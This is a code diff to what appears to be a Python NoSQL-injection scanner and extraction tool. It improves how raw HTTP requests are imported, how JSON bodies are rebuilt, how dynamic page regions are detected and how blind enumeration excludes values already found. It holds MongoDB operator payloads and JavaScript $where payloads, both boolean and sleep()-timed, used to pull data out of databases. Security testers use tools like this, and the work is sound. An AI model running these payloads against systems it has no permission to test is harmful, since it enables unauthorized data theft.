@@ -170,6 +170,24 @@ def _flatten_json(obj, path=""):
     return items
 
 
+def _flatten_json_full(obj, segs=()):
+    # Like _flatten_json, but also yields each leaf's exact segment path tagged
+    # ("k", key) for dict keys vs ("i", index) for list indices, so the original
+    # structure rebuilds faithfully -- a dotted display key alone is lossy
+    # (an object with numeric-string keys, or a key containing '.', is ambiguous).
+    if isinstance(obj, dict):
+        out = []
+        for k, v in obj.items():
+            out += _flatten_json_full(v, segs + (("k", str(k)),))
+        return out
+    if isinstance(obj, list):
+        out = []
+        for idx, v in enumerate(obj):
+            out += _flatten_json_full(v, segs + (("i", idx),))
+        return out
+    return [(".".join(str(s[1]) for s in segs) or "_", segs, obj)]
+
+
 def parse_raw_request(text, force_ssl=False):
     # Parse a raw HTTP request (Burp 'Copy to file' / repeater paste) into a
     # target dict the engine can drive, preserving the real headers/cookies/
@@ -213,35 +231,66 @@ def parse_raw_request(text, force_ssl=False):
 
     def _mark(name, value):
         if isinstance(value, str) and "*" in value:
-            inject.append(name)
+            if name not in inject:
+                inject.append(name)
             return value.replace("*", "")
         return value
+
+    def _group(pairs):
+        # Repeated keys (a=1&a=2) -> list value, so the multi-value param
+        # round-trips faithfully instead of collapsing to the last value.
+        out = {}
+        for k, v in pairs:
+            v = _mark(k, v)
+            if k in out:
+                out[k] = out[k] + [v] if isinstance(out[k], list) else [out[k], v]
+            else:
+                out[k] = v
+        return out
+
+    query_fields = _group(urllib.parse.parse_qsl(sp.query, keep_blank_values=True))
+    json_template = json_segmap = None
 
     if "json" in ctype and body:
         try:
             obj = _json.loads(body)
         except ValueError:
             obj = {}
-        fields = {path: _mark(path, leaf) for path, leaf in _flatten_json(obj).items()}
+        fields, json_segmap = {}, {}
+        for key, segs, leaf in _flatten_json_full(obj):
+            fields[key] = _mark(key, leaf)
+            json_segmap[key] = segs
+        json_template = obj
         vector = "json"
     elif body:
-        fields = {k: _mark(k, v) for k, v in urllib.parse.parse_qsl(body, keep_blank_values=True)}
+        fields = _group(urllib.parse.parse_qsl(body, keep_blank_values=True))
         vector = "form"
     else:
-        fields = {k: _mark(k, v) for k, v in urllib.parse.parse_qsl(sp.query, keep_blank_values=True)}
+        fields = {}
         vector = "form"
+
+    # Query-string params ride along on every request (sent as URL params) AND
+    # are injectable; a body param of the same name wins the collision.
+    param_fields = []
+    for k, v in query_fields.items():
+        if k not in fields:
+            fields[k] = v
+            param_fields.append(k)
 
     return {
         "method": method, "base_url": base_url, "headers": headers or None,
         "cookies": cookies or None, "fields": fields, "vector": vector,
         "vectors": [vector], "inject_fields": inject or None,
+        "param_fields": param_fields or None,
+        "json_template": json_template, "json_segmap": json_segmap,
     }
 
 
 class Ctx:
     def __init__(self, headers=None, verify=False, csrf=None, timeout=15, session=None,
                  proxies=None, retries=2, cookies=None,
-                 assert_true=None, assert_false=None, assert_regex=None, assert_code=None):
+                 assert_true=None, assert_false=None, assert_regex=None, assert_code=None,
+                 param_fields=None, json_template=None, json_segmap=None):
         self.session = session or requests.Session()
         self.headers = headers
         self.verify = verify
@@ -251,6 +300,9 @@ class Ctx:
         self.retries = retries    # transient-failure retries with backoff
         self.cookies = cookies    # dict of cookies sent on every request
         self.dynamic = []         # (prefix,suffix) markings of per-request-varying regions
+        self.param_fields = set(param_fields or [])   # field names sent as URL query params
+        self.json_template = json_template   # original parsed JSON body (structure template)
+        self.json_segmap = json_segmap       # {field: segment-path} for faithful JSON rebuild
         # User-assertable oracle (overrides the fuzzy comparison when set):
         self.assert_true = assert_true     # substring present only on a TRUE/match page
         self.assert_false = assert_false   # substring present only on a FALSE/no-match page
@@ -259,25 +311,35 @@ class Ctx:
 
 
 _DYN_LEN = 32
+_ISLAND_MIN = 8
 
 
 def _find_dynamic(a, b):
     # Two responses to identical-shape requests differ only in per-request
     # dynamic regions (CSRF tokens, timestamps, counters, reflected input).
     # Anchor each differing region with (prefix, suffix) drawn from the STATIC
-    # markup around it.  Only matching runs >= _DYN_LEN count as anchors, so
-    # short coincidental matches inside a random token don't fragment it into
-    # bogus markings (sqlmap's DYNAMICITY_BOUNDARY_LENGTH idea).
-    kept = [bl for bl in difflib.SequenceMatcher(None, a, b).get_matching_blocks()
-            if bl.size >= _DYN_LEN]
+    # markup around it (sqlmap's DYNAMICITY_BOUNDARY_LENGTH idea).
+    #
+    # A single greedy strip from one big static block to the next would also
+    # erase any SHORT static run sitting between two dynamic regions -- and that
+    # short run can be exactly where the true/false signal lives, collapsing a
+    # vulnerable response to look identical to the baseline.  So we also keep
+    # smaller static "islands" (>= _ISLAND_MIN) as anchor boundaries, and only
+    # strip a span when at least one bounding anchor is a LARGE (>= _DYN_LEN)
+    # static block -- short coincidental matches inside a random token never
+    # flank a strippable gap on their own, so the token still strips as one piece.
+    anchors = [bl for bl in difflib.SequenceMatcher(None, a, b).get_matching_blocks()
+               if bl.size >= _ISLAND_MIN]
     markings = []
-    for i in range(len(kept) - 1):
-        cur, nxt = kept[i], kept[i + 1]
+    for i in range(len(anchors) - 1):
+        cur, nxt = anchors[i], anchors[i + 1]
         end = cur.a + cur.size
         if nxt.a - end <= 0:
             continue
-        prefix = a[end - _DYN_LEN:end]
-        suffix = a[nxt.a:nxt.a + _DYN_LEN]
+        if cur.size < _DYN_LEN and nxt.size < _DYN_LEN:
+            continue                      # two small islands flanking a gap: likely noise
+        prefix = a[end - min(cur.size, _DYN_LEN):end]
+        suffix = a[nxt.a:nxt.a + min(nxt.size, _DYN_LEN)]
         if prefix and suffix:
             markings.append((prefix, suffix))
     return markings
@@ -394,10 +456,36 @@ def _json_set(root, keys, value):
             cur = child
 
 
-def _build_json(fields):
-    # Un-flatten dotted paths ("filter.user", "items.0.name") back into the
-    # nested structure, placing each field's rendered payload at its path.  A
-    # flat (dot-free) field name just becomes a top-level key.
+def _json_set_segs(root, segs, value):
+    # Walk a tagged segment path (("k",key)/("i",index)) into a cloned template,
+    # placing the payload at the exact leaf without guessing container types.
+    cur = root
+    for i, (kind, key) in enumerate(segs):
+        if i == len(segs) - 1:
+            _container_set(cur, key, value)
+        else:
+            child = _container_get(cur, key)
+            if not isinstance(child, (dict, list)):
+                child = [] if segs[i + 1][0] == "i" else {}
+                _container_set(cur, key, child)
+            cur = child
+
+
+def _build_json(fields, template=None, segmap=None):
+    # When the original JSON body is known (raw-request import), rebuild from a
+    # structural clone of it and overwrite each leaf at its recorded segment
+    # path -- this round-trips numeric-string keys and dotted keys faithfully.
+    # Otherwise fall back to un-flattening dotted paths ("filter.user",
+    # "items.0.name"); a flat (dot-free) name just becomes a top-level key.
+    if template is not None and segmap is not None:
+        root = _json.loads(_json.dumps(template))      # structural clone (pure JSON data)
+        for name, spec in fields.items():
+            segs = segmap.get(name)
+            if segs is None:
+                _json_set(root, name.split("."), _render_spec(spec))   # e.g. injected CSRF token
+            else:
+                _json_set_segs(root, segs, _render_spec(spec))
+        return root
     root = {}
     for name, spec in fields.items():
         _json_set(root, name.split("."), _render_spec(spec))
@@ -412,12 +500,17 @@ def _send(ctx, method, url, vector, fields):
             fields[ctx.csrf["field"]] = ("lit", token)
     kw = dict(headers=ctx.headers, allow_redirects=False, verify=ctx.verify,
               timeout=ctx.timeout, proxies=ctx.proxies, cookies=ctx.cookies)
+    pf = ctx.param_fields
     if method == "GET":
         kw["params"] = _build_form(fields)
-    elif vector == "json":
-        kw["json"] = _build_json(fields)
     else:
-        kw["data"] = _build_form(fields)
+        body_fields = {k: v for k, v in fields.items() if k not in pf}
+        if vector == "json":
+            kw["json"] = _build_json(body_fields, ctx.json_template, ctx.json_segmap)
+        else:
+            kw["data"] = _build_form(body_fields)
+        if pf:                          # query-string params imported from a raw request
+            kw["params"] = _build_form({k: v for k, v in fields.items() if k in pf})
     last = None
     for attempt in range(max(1, ctx.retries + 1)):
         try:
@@ -471,7 +564,13 @@ def _asserted(ctx, probe):
     if ctx.assert_false is not None:
         return ctx.assert_false not in probe.body
     if ctx.assert_regex is not None:
-        return re.search(ctx.assert_regex, probe.body) is not None
+        pat = ctx.assert_regex
+        try:
+            if hasattr(pat, "search"):        # pre-compiled (the run() path)
+                return pat.search(probe.body) is not None
+            return re.search(pat, probe.body) is not None
+        except re.error:
+            return None                       # bad raw pattern -> fall back to fuzzy
     return None
 
 
@@ -544,9 +643,13 @@ _ERROR_HINTS = ("missing", "exception", "traceback", "stack trace", "bad request
                 "<b>error</b>", "typeerror", "valueerror", "keyerror", "undefined index")
 
 
-def _looks_like_error(p, noise):
+def _looks_like_error(p, noise, ctx=None):
     # An operator payload that yields a short, error-shaped response is the
     # backend REJECTING the array (e.g. "Missing parameter"), not a bypass.
+    # A user-asserted oracle is authoritative: if it says this IS the TRUE/match
+    # page, never demote it to the "error" bucket on substring/length guesses.
+    if ctx is not None and _asserted(ctx, p) is True:
+        return False
     if p.status >= 400:
         return True
     low = p.body.lower()
@@ -663,7 +766,7 @@ def detect(base_url, method, fields_literal, headers=None, verify=False,
             findings.append({
                 "vector": vector, "label": label, "spec": spec, "reasons": reasons2,
                 "strong": positive and positive2, "status": t.status,
-                "length": t.length, "where": meta, "error": _looks_like_error(t2, noise),
+                "length": t.length, "where": meta, "error": _looks_like_error(t2, noise, ctx),
             })
 
     # Time-based blind $where: run when forced, or (auto) when no genuine $where
@@ -875,12 +978,35 @@ def _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, ex
     return is_true
 
 
+def _typed_excl(exclude):
+    # Coerce already-found values to numbers so $nin can skip them on the
+    # numeric path (extract() stores typed values as strings like "42").
+    nums = []
+    for x in (exclude or []):
+        try:
+            nums.append(int(x))
+        except (ValueError, TypeError):
+            try:
+                nums.append(float(x))
+            except (ValueError, TypeError):
+                pass
+    return nums
+
+
 def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude):
-    # Non-string fields: numeric (bisection) and boolean.
+    # Non-string fields: numeric (bisection) and boolean.  $nin of the already-
+    # found values forces each enumeration round onto a not-yet-seen document.
+    nin = _typed_excl(exclude)
+    seen = set(str(x) for x in (exclude or []))
+    def ops(d):
+        d = dict(d)
+        if nin:
+            d["$nin"] = nin
+        return ("ops", d)
     def probe(target_spec):
         return _field_probe(ctx, method, base_url, vector, fields_literal, field, target_spec, pin)
     try:
-        ref_true = probe(("ops", {"$exists": True}))
+        ref_true = probe(ops({"$exists": True}))
         ref_false = probe(("lit", _rand(16)))
     except requests.RequestException:
         return None
@@ -889,7 +1015,7 @@ def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, ex
 
     def gte(n):
         try:
-            return _classify_true(probe(("ops", {"$gte": n})), ref_true, ref_false, ctx)
+            return _classify_true(probe(ops({"$gte": n})), ref_true, ref_false, ctx)
         except requests.RequestException:
             return False
 
@@ -905,6 +1031,8 @@ def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, ex
         return lo                        # largest n with field>=n -> the value
 
     for bval in (True, False):           # boolean
+        if str(bval) in seen:
+            continue
         try:
             if _classify_true(probe(("lit", bval)), ref_true, ref_false, ctx):
                 return bval
@@ -913,7 +1041,8 @@ def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, ex
     return None
 
 
-def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target):
+def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target, exclude=None):
+    excl_js = _json.dumps([str(x) for x in (exclude or [])])
     def probe(testexpr):
         spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
         spec[inj_field] = ("lit", template % testexpr)
@@ -929,6 +1058,8 @@ def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, tem
     def is_true(pattern):
         js_pat = pattern.replace("/", "\\/")
         js = "this.%s!=null && /%s/.test(String(this.%s))" % (target, js_pat, target)
+        if exclude:                       # force enumeration onto a not-yet-found document
+            js = "(%s) && %s.indexOf(String(this.%s))<0" % (js, excl_js, target)
         try:
             return _classify_true(probe(js), true_sig, false_sig, ctx)
         except requests.RequestException:
@@ -973,7 +1104,8 @@ def discover_where(ctx, method, base_url, vector, fields_literal, where, maxlen=
 
     keys = []
     while len(keys) < 64:
-        excl = "[" + ",".join("'%s'" % k for k in keys) + "]"
+        excl = _json.dumps(keys)        # valid JS array literal; escapes quotes/backslashes
+                                        # in already-found key names (a raw join would break JS)
 
         def is_true(pattern, _excl=excl):
             jsp = pattern.replace("/", "\\/")
@@ -1101,6 +1233,8 @@ def _time_threshold(times, delay_secs):
 def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields=None, level=1):
     # Confirm a $where injection purely by response time: inject an unconditional
     # delay; if it slows (and a no-delay control stays fast), it's time-based.
+    if delay_ms <= 0:                 # a non-positive delay is a no-op payload whose
+        return []                     # threshold equals the mean -> pure noise oracle.
     secs = delay_ms / 1000.0
     targets = inject_fields or list(fields_literal)
     for vector in vectors:
@@ -1139,11 +1273,12 @@ def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, injec
     return []
 
 
-def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target, meta):
+def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target, meta, exclude=None):
     efmt = meta.get("efmt", "sleep(%d)")
     delay = meta["delay"]
     thr = meta["threshold"]
     delay_js = efmt % delay
+    excl_js = _json.dumps([str(x) for x in (exclude or [])])
 
     def probe(js):
         spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
@@ -1153,6 +1288,8 @@ def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field
     def is_true(pattern):
         jsp = pattern.replace("/", "\\/")
         cond = "this.%s!=null && /%s/.test(String(this.%s))" % (target, jsp, target)
+        if exclude:                       # force enumeration onto a not-yet-found document
+            cond = "(%s) && %s.indexOf(String(this.%s))<0" % (cond, excl_js, target)
         js = "(%s) ? %s : 0" % (cond, delay_js)   # delay only when the char matches
         try:
             if probe(js) <= thr:
@@ -1182,10 +1319,10 @@ def extract(base_url, method, vector, fields_literal, field, headers=None, verif
     if where and ext_method in ("auto", "where"):
         if where.get("time"):
             wis = _where_time_is_true(ctx, method, base_url, vector, fields_literal,
-                                      where["field"], where["template"], field, where)
+                                      where["field"], where["template"], field, where, exclude)
         else:
             wis = _where_is_true(ctx, method, base_url, vector, fields_literal,
-                                 where["field"], where["template"], field)
+                                 where["field"], where["template"], field, exclude)
         if wis:
             return _walk_value(wis, charset, maxlen, label=field, widen=_CHARSET_FULL)
     return None
@@ -1316,7 +1453,8 @@ def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args
 
 
 def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
-        cookies=None, inject_fields=None, vectors=None):
+        cookies=None, inject_fields=None, vectors=None,
+        param_fields=None, json_template=None, json_segmap=None):
     fields_literal = dict(fields_literal)
     csrf = None
     no_where = False
@@ -1337,9 +1475,10 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
         ext_method = (getattr(args, "extractMethod", None) or "auto").lower()
         time_based = (getattr(args, "timeBased", None) or "auto").lower()
         try:
-            delay_ms = int(getattr(args, "timeDelay", None) or 1000)
-        except (ValueError, TypeError):
-            delay_ms = 1000
+            delay_ms = max(50, int(getattr(args, "timeDelay", None) or 1000))
+        except (ValueError, TypeError):                # floor at 50ms: a 0/negative delay
+            delay_ms = 1000                            # makes sleep() a no-op and the
+                                                       # threshold collapse to the mean.
         proxy = _parse_proxy(getattr(args, "proxy", None))
         try:
             retries = int(getattr(args, "retries", None) or 2)
@@ -1356,6 +1495,12 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
         a_true = getattr(args, "trueString", None)
         a_false = getattr(args, "falseString", None)
         a_regex = getattr(args, "trueRegex", None)
+        if a_regex:
+            try:
+                a_regex = re.compile(a_regex)          # compile once; a bad pattern must not
+            except re.error as e:                      # crash the scan on the first probe.
+                print("  [oracle] ignoring invalid --trueRegex (%s)" % e)
+                a_regex = None
         tc = getattr(args, "trueCode", None)
         a_code = int(tc) if tc and str(tc).isdigit() else None
 
@@ -1382,7 +1527,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
 
     ctx = Ctx(headers, verify, csrf, timeout=max(15, int(delay_ms / 1000 * 5) + 5),
               proxies=proxy, retries=retries, cookies=cookies,
-              assert_true=a_true, assert_false=a_false, assert_regex=a_regex, assert_code=a_code)
+              assert_true=a_true, assert_false=a_false, assert_regex=a_regex, assert_code=a_code,
+              param_fields=param_fields, json_template=json_template, json_segmap=json_segmap)
     findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx,
                       time_based=time_based, delay_ms=delay_ms,
                       inject_fields=inject_fields, vectors=vectors,
